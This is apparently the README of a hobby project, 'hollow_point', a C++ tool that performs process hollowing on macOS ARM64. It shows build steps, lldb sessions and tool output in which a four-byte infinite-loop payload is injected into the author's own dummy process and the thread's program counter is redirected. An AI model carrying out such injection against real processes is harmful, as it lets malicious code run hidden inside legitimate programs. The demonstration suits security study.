  # hollow_point .
Process Hollowing for macOS (ARM64)

## Table of Contents
- [Description](#description)
- [DISCLAIMER](#disclaimer)
- [Prerequisites](#prerequisites)
- [Usage](#usage)
  - [0. XCODE??]
  - [1. Compile the Dummy Process]

## Description
**hollow_point** is a C++ tool for macOS (ARM64) that performs process hollowing by injecting and executing custom payloads within target processes by using macOS's Mach.

## DISCLAIMER
_Process hollowing and code injection techniques can be used maliciously and may violate system security policies or laws. Ensure you have explicit permission to perform such operations on target processes and understand the legal and ethical implications. Use this tool responsibly and only in controlled environments for educational or authorized purposes._

## Prerequisites
- **Operating System:** macOS (ARM64 architecture)
- **Permissions:** Must run with elevated privileges (`sudo`) to access target process ports.
- **Dependencies:** Xcode Command Line Tools (for compiling C++)

## Usage
0. XCODE:
   Always do `xcode-select --install` for some reason (?).
1. Compile the Dummy Process: DO 
    ```
    g++ -o dummy dummy.cpp
    ./dummy
    Dummy process running with PID: 93288
    ```
    (Remember this PID)
    (Keep this running)
2. Generate the Payload: DO 
    ```
    g++ generate_payload.cpp -o generate_payload
    ./generate_payload
    ```
    (It'll create a payload.bin in the working dir for you that is an ARM64 infinite loop
3. Run `lldb` and attach the PID:
    ```
    lldb -p 93288
    (lldb) process attach --pid 93288
    Process 93288 stopped
    * thread #1, queue = 'com.apple.main-thread', stop reason = signal SIGSTOP
        frame #0: 0x000000018a0133c8 libsystem_kernel.dylib`__semwait_signal + 8
    libsystem_kernel.dylib`__semwait_signal:
    ->  0x18a0133c8 <+8>:  b.lo   0x18a0133e8    ; <+40>
        0x18a0133cc <+12>: pacibsp 
        0x18a0133d0 <+16>: stp    x29, x30, [sp, #-0x10]!
        0x18a0133d4 <+20>: mov    x29, sp
    Target 0: (dummy) stopped.
    Executable module set to "../dummy".
    Architecture set to: arm64-apple-macosx-.
    (lldb) register read
        General Purpose Registers:
            x0 = 0x0000000000000004
            ...
            x28 = 0x0000000000000000
            fp = 0x000000016f852ec0
            lr = ...
            sp = 0x000000016f852e90
            pc = 0x000000018a0133c8  libsystem_kernel.dylib`__semwait_signal + 8
          cpsr = 0x60001000

    (lldb) stepi
    Process 93288 stopped
    * thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into
        frame #0: 0x000000018a0133cc libsystem_kernel.dylib`__semwait_signal + 12
    libsystem_kernel.dylib`__semwait_signal:
    ->  0x18a0133cc <+12>: pacibsp 
        0x18a0133d0 <+16>: stp    x29, x30, [sp, #-0x10]!
        0x18a0133d4 <+20>: mov    x29, sp
        0x18a0133d8 <+24>: bl     0x18a011668    ; cerror
    Target 0: (dummy) stopped.
    (lldb) stepi
    Process 93288 stopped
    * thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into
        frame #0: 0x000000018a0133d0 libsystem_kernel.dylib`__semwait_signal + 16
    libsystem_kernel.dylib`__semwait_signal:
    ->  0x18a0133d0 <+16>: stp    x29, x30, [sp, #-0x10]!
        0x18a0133d4 <+20>: mov    x29, sp
        0x18a0133d8 <+24>: bl     0x18a011668    ; cerror
        0x18a0133dc <+28>: mov    sp, x29
    Target 0: (dummy) stopped.
    (lldb) stepi
    Process 93288 stopped
    * thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into
        frame #0: 0x000000018a0133d4 libsystem_kernel.dylib`__semwait_signal + 20
    libsystem_kernel.dylib`__semwait_signal:
    ->  0x18a0133d4 <+20>: mov    x29, sp
        0x18a0133d8 <+24>: bl     0x18a011668    ; cerror
        0x18a0133dc <+28>: mov    sp, x29
        0x18a0133e0 <+32>: ldp    x29, x30, [sp], #0x10
    Target 0: (dummy) stopped.
    (lldb) register read
    General Purpose Registers:
            x0 = 0x0000000000000004
            ...
            x28 = 0x0000000000000000
            fp = 0x000000016f852ec0
            lr = ...
            sp = 0x000000016f852e80
            pc = 0x000000018a0133d4  << BAI ..^^
      cpsr = 0x60001000
    ```
    (Keep this running)
5. Compile and Run the hollow_point
    ```
    g++ hollow_point.cpp -o hollow_point
    sudo ./hollow_point 93288 payload.bin
    Target PID: 93288
    Payload file: payload.bin
    Resolved payload file path: /.../hollow_point/payload.bin
    Payload file read successfully. Size: 4 bytes.
    Payload injected at address: 0x100618000 << HELLO THERE ~~~~
    Original PC for thread 1e03: 0x18a0133d4 << BAI ..^^
    New PC for thread 1e03: 0x100618000
    Thread state updated successfully for thread: 1e03
    Thread resumed successfully.
    Process hollowing complete.
    ```
    (See the injected/original addresses)
6. Take a step in `lldb`:
   ```
    (lldb) stepi
    Process 93288 stopped
    * thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into
        frame #0: 0x0000000100618000
    ->  0x100618000: b      0x100618000
        0x100618004: udf    #0x0
        0x100618008: udf    #0x0
        0x10061800c: udf    #0x0
    Target 0: (dummy) stopped.
    (lldb) register read
    General Purpose Registers:
            x0 = 0x0000000000000004
            ...
           x28 = 0x0000000000000000
            fp = 0x000000016f852ec0
            lr = ...
            sp = 0x000000016f852e80
            pc = 0x0000000100618000 << HELLO ~~~~
      cpsr = 0x60001000

    (lldb) stepi
    (lldb) lol
    error: 'lol' is not a valid command.
    (lldb) exit
    ```

7. Observe crash in both `lldb` and dummy script:
   ```
   ./dummy
    Dummy process running with PID: 93288
    exit^Z^Z^Z^Z^C^C^C
   nothing happens lol
   (lldb) exit
   Quitting LLDB will detach from one or more processes. Do you really want to proceed: [Y/n] y
    ^C^Z
    zsh: suspended  lldb -p 93288
   ```
   
   
